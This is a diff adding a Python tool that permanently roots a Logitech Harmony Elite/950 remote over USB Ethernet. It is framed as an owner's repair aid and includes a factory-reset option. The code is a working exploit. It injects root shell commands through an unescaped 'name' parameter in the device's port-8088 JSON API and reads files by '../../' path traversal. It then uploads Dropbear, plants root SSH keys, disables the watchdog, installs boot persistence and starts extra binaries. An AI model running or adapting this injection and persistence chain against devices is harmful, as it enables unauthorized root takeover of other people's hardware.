@@ -1,0 +1,536 @@
+#!/usr/bin/env python3
+"""All-in-one setup tool for Logitech Harmony Elite / 950 Handheld Remote.
+
+Transforms a stock/factory remote into a permanently rooted device with:
+- Persistent USB Ethernet on every boot (no touchscreen needed)
+- Hardware watchdog disabled (no kernel panic reboots)
+- Dropbear SSH server on 192.168.2.1:22 with public-key authentication
+
+Usage:
+    python elite/setup_remote.py
+    python elite/setup_remote.py --step 1   (USB HID debug unlock only)
+    python elite/setup_remote.py --step 2   (Dropbear & persistence install only)
+"""
+
+import argparse
+import base64
+import json
+import math
+import os
+import pathlib
+import socket
+import subprocess
+import sys
+import time
+import urllib.request
+
+REMOTE_IP = "192.168.2.1"
+REMOTE_PORT = 8088
+REMOTE_USB_PID = 0xC12B
+REMOTE_USB_VID = 0x046D
+
+SCRIPT_DIR = pathlib.Path(__file__).resolve().parent
+REPO_DIR = SCRIPT_DIR.parent
+TINY_PATH = SCRIPT_DIR / "b64dec_tiny"
+DROPBEAR_PATH = SCRIPT_DIR / "bin" / "dropbearmulti_musl"
+DEFAULT_KEY_PATH = None
+
+LUA_DECODER_ONELINE = (
+    "local c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' "
+    "local lut={} for i=1,64 do lut[c:byte(i)]=i-1 end "
+    "local function d(s) local o,n,l,i={},0,#s,1 while i<=l do "
+    "local b1,b2,b3,b4=lut[s:byte(i)],lut[s:byte(i+1)],lut[s:byte(i+2)],lut[s:byte(i+3)] "
+    "if not b1 or not b2 then break end "
+    "n=n+1 o[n]=string.char((b1*4)+math.floor(b2/16)) "
+    "if b3 then n=n+1 o[n]=string.char(((b2%16)*16)+math.floor(b3/4)) "
+    "if b4 then n=n+1 o[n]=string.char(((b3%4)*64)+b4) end end "
+    "i=i+4 end return table.concat(o) end "
+    "local f,g,r=io.open(arg[1],'r'),io.open(arg[2],'wb'),'' "
+    "while true do local k=f:read(16384) if not k then break end "
+    "k=r..k:gsub('%s+','') local t=#k-(#k%4) if t>0 then g:write(d(k:sub(1,t))) "
+    "r=k:sub(t+1) else r=k end end "
+    "if #r>0 then g:write(d(r)) end f:close() g:close()"
+)
+
+
+# ==============================================================================
+# Helper functions
+# ==============================================================================
+
+def rce(cmd: str, timeout: int = 15) -> None:
+    """Execute arbitrary root command via unescaped rm -rf injection on port 8088."""
+    body = {
+        "id": 1,
+        "cmd": "setup.firmware?packageremove",
+        "params": {"name": "; " + cmd},
+    }
+    req = urllib.request.Request(
+        f"http://{REMOTE_IP}:{REMOTE_PORT}/",
+        data=json.dumps(body).encode("utf-8"),
+        headers={
+            "Content-Type": "application/json",
+            "Origin": "http://sl.myharmony.com",
+        },
+    )
+    with urllib.request.urlopen(req, timeout=timeout) as r:
+        pass
+
+
+def read_json_val(remote_file: str, key: str, timeout: int = 5) -> str:
+    """Read a JSON key from a remote file via connect.jsonfiletransfer?get."""
+    parts = remote_file.strip("/").split("/")
+    folder = "../../" + "/".join(parts[:-1]) if len(parts) > 1 else "../.."
+    filename = parts[-1]
+    body = {
+        "id": 2,
+        "cmd": "connect.jsonfiletransfer?get",
+        "params": {"path": folder, "file": filename},
+    }
+    req = urllib.request.Request(
+        f"http://{REMOTE_IP}:{REMOTE_PORT}/",
+        data=json.dumps(body).encode("utf-8"),
+        headers={
+            "Content-Type": "application/json",
+            "Origin": "http://sl.myharmony.com",
+        },
+    )
+    with urllib.request.urlopen(req, timeout=timeout) as r:
+        res = json.loads(r.read().decode("utf-8"))
+        return res.get("data", {}).get(key, "")
+
+
+def probe_remote(ip: str = REMOTE_IP, port: int = REMOTE_PORT, timeout: float = 1.0) -> bool:
+    """Check if remote HTTP port is reachable."""
+    s = socket.socket()
+    s.settimeout(timeout)
+    try:
+        s.connect((ip, port))
+        s.close()
+        return True
+    except Exception:
+        return False
+
+
+# ==============================================================================
+# STEP 1: Enable Debug Mode over USB HID
+# ==============================================================================
+
+def step1_enable_usb_debug() -> bool:
+    print("\n" + "=" * 70)
+    print(" [STEP 1/2] ENABLING DEBUG MODE OVER USB HID")
+    print("=" * 70)
+
+    # Import clean-room Harmony HID driver
+    if str(REPO_DIR) not in sys.path:
+        sys.path.insert(0, str(REPO_DIR))
+
+    try:
+        from tools.harmony_hid import HarmonyHid, ELITE_PID
+    except ImportError as e:
+        print(f"[-] Error: Could not import tools.harmony_hid: {e}")
+        return False
+
+    print("[*] Connecting to Harmony Remote over USB HID (046D:C12B)...")
+    hid = HarmonyHid(pid=ELITE_PID)
+    if not hid.open():
+        print("[-] USB connection failed.")
+        print("    Ensure remote is plugged in via USB and powered ON.")
+        return False
+
+    try:
+        print("[*] Writing '1' to /tde/enable...")
+        if hid.set_tde_enable(True):
+            print("[+] SUCCESS: /etc/tdeenable is active on the remote!")
+            return True
+        else:
+            print("[-] Failed to write /tde/enable.")
+            return False
+    except Exception as e:
+        print(f"[-] Error writing /tde/enable: {e}")
+        return False
+    finally:
+        hid.close()
+
+
+def print_step1_instructions() -> None:
+    print("\n" + "=" * 70)
+    print(" HARMONY ELITE: ENABLING USB ETHERNET (3 METHODS)")
+    print("=" * 70)
+    print(" [Method A] Hardware Recovery Mode (Recommended if touchscreen is broken):")
+    print("   1. Unplug remote from USB and cradle.")
+    print("   2. Hold 'Menu' + 'Mute' simultaneously for 15s (or hold 'Off' while plugging in USB).")
+    print("   3. Screen shows USB gear icon -> boots directly into RNDIS USB Ethernet.")
+    print()
+    print(" [Method B] Keypad Debug Menu (No touchscreen needed):")
+    print("   1. On running remote keypad, press: >> (Fast Forward) + Stop + Red button.")
+    print("   2. Use physical D-pad (Up/Down) to highlight 'Enable USB Ethernet'.")
+    print("   3. Press physical Center/OK button to activate.")
+    print()
+    print(" [Method C] Direct USB HID Staging:")
+    print("   - Run 'python tools/root_remote_usb.py' to stage Dropbear over USB HID.")
+    print()
+    print(" ----------------------------------------------------------------------")
+    print(" CONFIGURE STATIC IP ON PC:")
+    print("   - A 'Remote NDIS / Ethernet Gadget' network adapter will appear on PC.")
+    print("   - Open Network Connections (Win+R -> ncpa.cpl).")
+    print("   - Right-click adapter -> Properties -> IPv4 -> Properties:")
+    print("        IP Address:      192.168.2.2")
+    print("        Subnet Mask:     255.255.255.0")
+    print("        Default Gateway: 192.168.2.1")
+    print("=" * 70)
+
+
+def wait_for_ethernet() -> bool:
+    print(f"\n[*] Probing remote at http://{REMOTE_IP}:{REMOTE_PORT}/...")
+    print("    (Waiting for USB Ethernet connection to become active. Press Ctrl+C to cancel)")
+    for _ in range(120):
+        if probe_remote():
+            print(f"[+] Connected! Remote HTTP service detected at {REMOTE_IP}:{REMOTE_PORT}")
+            return True
+        time.sleep(1)
+        print(".", end="", flush=True)
+    print("\n[-] Timeout waiting for remote network interface.")
+    return False
+
+
+# ==============================================================================
+# SSH Key Management
+# ==============================================================================
+
+def resolve_default_key_path() -> pathlib.Path:
+    """Find most recently modified harmony_owner_* key in ~/.ssh or default to harmony_owner_ed25519."""
+    ssh_dir = pathlib.Path.home() / ".ssh"
+    if ssh_dir.is_dir():
+        keys = [
+            p
+            for p in ssh_dir.glob("harmony_owner_*")
+            if p.is_file() and not p.name.endswith(".pub")
+        ]
+        if keys:
+            return sorted(keys, key=lambda p: p.stat().st_mtime, reverse=True)[0]
+    return ssh_dir / "harmony_owner_ed25519"
+
+
+def ensure_ssh_key(key_path: pathlib.Path | None = None) -> pathlib.Path:
+    """Resolve existing harmony_owner key or generate a new ED25519 keypair."""
+    if key_path is None:
+        key_path = resolve_default_key_path()
+
+    pub_path = key_path.with_suffix(".pub")
+    if key_path.exists() and pub_path.exists():
+        print(f"[*] Reusing existing Harmony owner key: {key_path}")
+        return pub_path
+
+    print(f"[*] No existing key found. Generating new Harmony owner keypair at {key_path}...")
+    key_path.parent.mkdir(parents=True, exist_ok=True)
+    cmd = [
+        "ssh-keygen",
+        "-t", "ed25519",
+        "-f", str(key_path),
+        "-N", "",
+        "-C", "harmony-owner",
+    ]
+    try:
+        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except FileNotFoundError:
+        print("[-] Error: ssh-keygen not found in system PATH.")
+        sys.exit(1)
+
+    print(f"[+] Keypair created: {pub_path.name}")
+    return pub_path
+
+
+
+def update_ssh_config(key_path: pathlib.Path) -> None:
+    """Optionally add Host entry to ~/.ssh/config."""
+    config_path = pathlib.Path.home() / ".ssh" / "config"
+    config_entry = (
+        f"\nHost {REMOTE_IP} harmony-remote\n"
+        f"    HostName {REMOTE_IP}\n"
+        f"    User root\n"
+        f"    IdentityFile {key_path}\n"
+        f"    StrictHostKeyChecking accept-new\n"
+    )
+    try:
+        existing = config_path.read_text(encoding="utf-8") if config_path.exists() else ""
+        if REMOTE_IP not in existing:
+            config_path.parent.mkdir(parents=True, exist_ok=True)
+            with open(config_path, "a", encoding="utf-8") as f:
+                f.write(config_entry)
+            print(f"[+] Added '{REMOTE_IP}' to {config_path}")
+    except Exception as e:
+        print(f"[*] Note: Could not update {config_path}: {e}")
+
+
+# ==============================================================================
+# STEP 2: Install Dropbear & Persistence
+# ==============================================================================
+
+def step2_install_permanent_ssh(pub_path: pathlib.Path) -> bool:
+    print("\n" + "=" * 70)
+    print(" [STEP 2/2] INSTALLING PERSISTENT DROPBEAR SSH & USB ETHERNET")
+    print("=" * 70)
+
+    if not TINY_PATH.exists():
+        print(f"[-] Error: Native ARM decoder missing at {TINY_PATH}")
+        return False
+    if not DROPBEAR_PATH.exists():
+        print(f"[-] Error: musl Dropbear binary missing at {DROPBEAR_PATH}")
+        return False
+
+    # 1. Disable hardware watchdog permanently
+    print("[*] Disabling hardware watchdog (/etc/nowatchdog)...")
+    rce("touch /etc/nowatchdog; chmod 644 /etc/nowatchdog")
+
+    # 2. Stage native ARM base64 decoder
+    tiny_bytes = TINY_PATH.read_bytes()
+    tiny_b64 = base64.b64encode(tiny_bytes).decode("ascii")
+    print(f"[*] Staging native ARM base64 decoder ({len(tiny_bytes)} bytes)...")
+    rce(f'echo "{LUA_DECODER_ONELINE}" > /tmp/bootstrap.lua')
+    rce(f'echo "{tiny_b64}" > /tmp/tiny.b64')
+    rce("/usr/bin/lua /tmp/bootstrap.lua /tmp/tiny.b64 /tmp/b64dec_tiny")
+    rce("chmod 755 /tmp/b64dec_tiny; rm -f /tmp/bootstrap.lua /tmp/tiny.b64")
+
+    # Verify b64dec_tiny
+    rce('sz=$(ls -l /tmp/b64dec_tiny 2>/dev/null | awk "{print \\$5}"); echo "{\\"sz\\": \\"$sz\\"}" > /tmp/tinysz.json')
+    actual_tiny_sz = read_json_val("/tmp/tinysz.json", "sz")
+    if actual_tiny_sz != str(len(tiny_bytes)):
+        print(f"[-] Decoder staging failed (got {actual_tiny_sz}, expected {len(tiny_bytes)})")
+        return False
+    print("[+] Native ARM decoder verified.")
+
+    # 3. Stream Dropbear binary in chunks
+    dropbear_bytes = DROPBEAR_PATH.read_bytes()
+    expected_sz = len(dropbear_bytes)
+    db_b64 = base64.b64encode(dropbear_bytes).decode("ascii")
+    chunk_sz = 8192
+    total_chunks = math.ceil(len(db_b64) / chunk_sz)
+
+    print(f"[*] Uploading musl Dropbear binary ({expected_sz:,} bytes in {total_chunks} chunks)...")
+    rce("rm -f /tmp/dropbear.b64 /data/dropbearmulti")
+    t0 = time.time()
+    for i in range(total_chunks):
+        chunk = db_b64[i * chunk_sz : (i + 1) * chunk_sz]
+        rce(f"echo -n '{chunk}' >> /tmp/dropbear.b64")
+        if (i + 1) % 15 == 0 or (i + 1) == total_chunks:
+            pct = int((i + 1) / total_chunks * 100)
+            print(f"    Uploaded {i + 1}/{total_chunks} chunks ({pct}%)")
+
+    # 4. Decode binary on device in milliseconds
+    print("[*] Decoding binary with native ARM decoder...")
+    rce("/tmp/b64dec_tiny /tmp/dropbear.b64 /data/dropbearmulti")
+    rce("rm -f /tmp/dropbear.b64 /tmp/b64dec_tiny")
+
+    # Verify Dropbear binary size
+    rce('sz=$(ls -l /data/dropbearmulti 2>/dev/null | awk "{print \\$5}"); echo "{\\"sz\\": \\"$sz\\"}" > /tmp/dbsz.json')
+    actual_db_sz = read_json_val("/tmp/dbsz.json", "sz")
+    if actual_db_sz != str(expected_sz):
+        print(f"[-] Dropbear size mismatch (got {actual_db_sz}, expected {expected_sz})")
+        return False
+    print(f"[+] Dropbear multi-call binary verified ({actual_db_sz} bytes).")
+
+    # 5. Create symlinks and directories
+    print("[*] Configuring symlinks and hostkeys...")
+    setup_cmds = [
+        "chmod 755 /data/dropbearmulti",
+        "mkdir -p /data/bin /etc/dropbear /home/root/.ssh /root/.ssh",
+        "ln -sf /data/dropbearmulti /data/bin/dropbear",
+        "ln -sf /data/dropbearmulti /data/bin/dropbearkey",
+        "ln -sf /data/dropbearmulti /usr/sbin/dropbear",
+        "ln -sf /data/dropbearmulti /usr/sbin/dropbearkey",
+        "ln -sf /data/dropbearmulti /usr/sbin/dbclient",
+        "ln -sf /data/dropbearmulti /usr/sbin/scp",
+        "[ -f /etc/dropbear/dropbear_rsa_host_key ] || /usr/sbin/dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key",
+        "[ -f /etc/dropbear/dropbear_ed25519_host_key ] || /usr/sbin/dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key",
+        "chmod 700 /home/root /home/root/.ssh /root /root/.ssh",
+    ]
+    rce("; ".join(setup_cmds))
+
+    # 6. Install public key
+    pubkey = pub_path.read_text("utf-8").strip()
+    print(f"[*] Installing public key ({pubkey.split()[-1]})...")
+    key_cmds = [
+        f"echo '{pubkey}' > /home/root/.ssh/authorized_keys",
+        f"echo '{pubkey}' > /root/.ssh/authorized_keys",
+        f"echo '{pubkey}' > /etc/dropbear/authorized_keys",
+        "chmod 600 /home/root/.ssh/authorized_keys /root/.ssh/authorized_keys /etc/dropbear/authorized_keys",
+    ]
+    rce("; ".join(key_cmds))
+
+    # 7. Make persistent in /etc/init.d/rcS.local
+    print("[*] Preserving stock configuration backup...")
+    rce("mkdir -p /data/stock_backup; if [ -f /etc/init.d/rcS.local ] && [ ! -f /data/stock_backup/rcS.local.orig ]; then if ! grep -q 'codex' /etc/init.d/rcS.local 2>/dev/null; then cp -f /etc/init.d/rcS.local /data/stock_backup/rcS.local.orig; fi; fi")
+    print("[*] Installing boot persistence (/etc/init.d/rcS.local)...")
+    rcs = "#!/bin/sh\\n/usr/bin/usbeth start &\\n/usr/sbin/dropbear -R -p 0.0.0.0:22\\n"
+    rce(f"echo -e '{rcs}' > /etc/init.d/rcS.local; chmod 755 /etc/init.d/rcS.local")
+
+    # 8. Start Dropbear daemon
+    print("[*] Launching Dropbear SSH daemon on port 22...")
+    rce("killall -9 dropbearmulti dropbear 2>/dev/null; /usr/sbin/dropbear -R -p 0.0.0.0:22")
+    time.sleep(1)
+
+    # 9. Verify SSH connection
+    print("[*] Verifying SSH connectivity...")
+    test_cmd = [
+        "ssh",
+        "-o", "StrictHostKeyChecking=accept-new",
+        "-o", "BatchMode=yes",
+        "-o", "ConnectTimeout=5",
+        "-i", str(pub_path.with_suffix("")),
+        f"root@{REMOTE_IP}",
+        "uname -a; id",
+    ]
+    try:
+        res = subprocess.run(test_cmd, capture_output=True, text=True, check=True)
+        print(f"[+] Remote response:\n    {res.stdout.strip()}")
+    except subprocess.CalledProcessError as e:
+        print(f"[-] SSH verification error: {e.stderr.strip()}")
+        return False
+
+    # 10. Deploy Elite payload binaries & rcS.local (from deploy_elite.py)
+    print("\n" + "=" * 70)
+    print(" [*] DEPLOYING CODEX_ELITE RUNTIME & RECOVERY RCS.LOCAL")
+    print("=" * 70)
+    priv_path = pub_path.with_suffix("")
+    ssh_opts = [
+        "-o", "StrictHostKeyChecking=accept-new",
+        "-o", "BatchMode=yes",
+        "-i", str(priv_path),
+    ]
+    scp_opts = ["-O"] + ssh_opts
+    target = f"root@{REMOTE_IP}"
+
+    # Upload ARM binaries to /data/
+    bin_dir = SCRIPT_DIR / "bin"
+    binaries = ["codex_elite", "codex_sync", "scp", "dropbearkey"]
+    print("[*] Uploading ARM runtime binaries to /data/...")
+    for b in binaries:
+        src = bin_dir / b
+        if src.is_file():
+            print(f"    -> {b}")
+            subprocess.run(["scp"] + scp_opts + [str(src), f"{target}:/data/{b}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    # Upload rcS.local recovery script
+    rcs_file = SCRIPT_DIR / "rcS.local"
+    if rcs_file.is_file():
+        print("[*] Uploading /etc/init.d/rcS.local (reboot counter & force USB Ethernet)...")
+        subprocess.run(["scp"] + scp_opts + [str(rcs_file), f"{target}:/etc/init.d/rcS.local"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    # Finalize permissions, symlinks, and launch codex_elite
+    print("[*] Finalizing permissions and starting codex_elite...")
+    post_cmds = (
+        "chmod 755 /data/codex_* /data/dropbear* /data/scp /etc/init.d/rcS.local 2>/dev/null || true; "
+        "chmod -x /usr/bin/usbhid /usr/bin/watchdog 2>/dev/null || true; "
+        "ln -sf /data/codex_sync /data/sync 2>/dev/null || true; "
+        "ln -sf /data/codex_sync /usr/bin/sync 2>/dev/null || true; "
+        "ln -sf /data/dropbearmulti /data/dropbear 2>/dev/null || true; "
+        "ln -sf /data/dropbearmulti /usr/sbin/dropbear 2>/dev/null || true; "
+        "killall -9 codex_elite 2>/dev/null || true; "
+        "/data/codex_elite > /tmp/codex_elite.log 2>&1 & "
+        "sleep 1; pidof codex_elite || echo 'offline'"
+    )
+    res = subprocess.run(["ssh"] + ssh_opts + [target, post_cmds], capture_output=True, text=True)
+    out = res.stdout.strip()
+    print(f"[+] codex_elite status: {out}")
+    return True
+
+
+# ==============================================================================
+# Main Orchestrator
+# ==============================================================================
+
+def main():
+    parser = argparse.ArgumentParser(description="Logitech Harmony Elite all-in-one setup tool.")
+    parser.add_argument("--step", type=int, choices=[1, 2], help="Run step 1 or 2 individually.")
+    parser.add_argument("--key", type=pathlib.Path, default=DEFAULT_KEY_PATH, help="Path to SSH key.")
+    parser.add_argument("--factory-reset", action="store_true", help="Revert Harmony Elite to official stock firmware.")
+    args = parser.parse_args()
+
+    print("=" * 70)
+    print(" LOGITECH HARMONY ELITE / 950 - ALL-IN-ONE SETUP")
+    if args.factory_reset:
+        print(" MODE: FACTORY RESET & STOCK RESTORATION")
+    print("=" * 70)
+
+    if args.factory_reset:
+        conf = input("\nType 'FACTORY-RESET' to confirm reverting Elite to stock: ").strip()
+        if conf != "FACTORY-RESET":
+            print("[-] Confirmation mismatch. Aborting reset.")
+            sys.exit(1)
+        if not probe_remote():
+            print(f"[-] Cannot reach remote at {REMOTE_IP}:{REMOTE_PORT}. Ensure USB Ethernet is active.")
+            sys.exit(1)
+        print("[*] Reverting remote to stock configuration...")
+        revert_cmds = [
+            "killall -9 codex_elite 2>/dev/null || true",
+            "if [ -f /data/stock_backup/rcS.local.orig ]; then cp -f /data/stock_backup/rcS.local.orig /etc/init.d/rcS.local; chmod 755 /etc/init.d/rcS.local; else rm -f /etc/init.d/rcS.local; fi",
+            "chmod +x /usr/bin/watchdog /usr/bin/usbhid /usr/bin/hal /opt/luaworks/luaworks /opt/luadraws/luadraws 2>/dev/null || true",
+            "rm -f /etc/nowatchdog /data/reboot_counter /data/codex_elite.conf /tmp/codex_elite.log 2>/dev/null || true",
+            "rm -f /data/codex_* /data/dropbear* /data/sync /data/mknod /data/scp /data/busybox 2>/dev/null || true",
+            "rm -f /usr/bin/sync /usr/sbin/dropbear /usr/sbin/dropbearkey /usr/sbin/dbclient /usr/sbin/scp 2>/dev/null || true",
+            "/data/codex_sync 2>/dev/null || /data/sync 2>/dev/null || sync 2>/dev/null || true",
+            "reboot -f 2>/dev/null &",
+        ]
+        rce("; ".join(revert_cmds))
+        print("[+] Elite Remote has been reverted and is rebooting into official stock firmware!")
+        sys.exit(0)
+
+    pub_path = ensure_ssh_key(args.key)
+    priv_path = pub_path.with_suffix("")
+    update_ssh_config(priv_path)
+
+    if args.step == 1:
+        if not step1_enable_usb_debug():
+            sys.exit(1)
+        print_step1_instructions()
+        return
+
+    if args.step == 2:
+        if not probe_remote():
+            print(f"[-] Cannot reach {REMOTE_IP}:{REMOTE_PORT}. Ensure USB Ethernet is enabled.")
+            sys.exit(1)
+        if not step2_install_permanent_ssh(pub_path):
+            sys.exit(1)
+        print_success(priv_path)
+        return
+
+    # Default: Run full 2-step setup flow
+    if not probe_remote():
+        print("[*] Remote network interface not currently active. Running Step 1...")
+        if not step1_enable_usb_debug():
+            print("[-] Step 1 failed. Aborting.")
+            sys.exit(1)
+        print_step1_instructions()
+        input("\nPress [Enter] after you have enabled USB Ethernet and configured static IP...")
+        if not wait_for_ethernet():
+            print("[-] Could not reach remote. Please check IP configuration.")
+            sys.exit(1)
+    else:
+        print(f"[+] Remote USB Ethernet already active at {REMOTE_IP}:{REMOTE_PORT}. Skipping Step 1.")
+
+    if not step2_install_permanent_ssh(pub_path):
+        print("[-] Step 2 failed.")
+        sys.exit(1)
+
+    print_success(priv_path)
+
+
+def print_success(priv_path: pathlib.Path):
+    print("\n" + "=" * 70)
+    print(" [+] INSTALLATION COMPLETE! REMOTE IS PERMANENTLY ROOTED")
+    print("=" * 70)
+    print(" Features enabled:")
+    print("  + Hardware watchdog disabled (/etc/nowatchdog)")
+    print("  + Dropbear SSH daemon installed on NAND (/data/dropbearmulti)")
+    print("  + USB Ethernet & Dropbear auto-start on boot (/etc/init.d/rcS.local)")
+    print("  + Broken touchscreen no longer needed to access remote")
+    print()
+    print(" Connect to your remote anytime over USB:")
+    print(f"    ssh -i {priv_path} root@{REMOTE_IP}")
+    print(" or simply:")
+    print(f"    ssh root@{REMOTE_IP}")
+    print("=" * 70 + "\n")
+
+
+if __name__ == "__main__":
+    main()
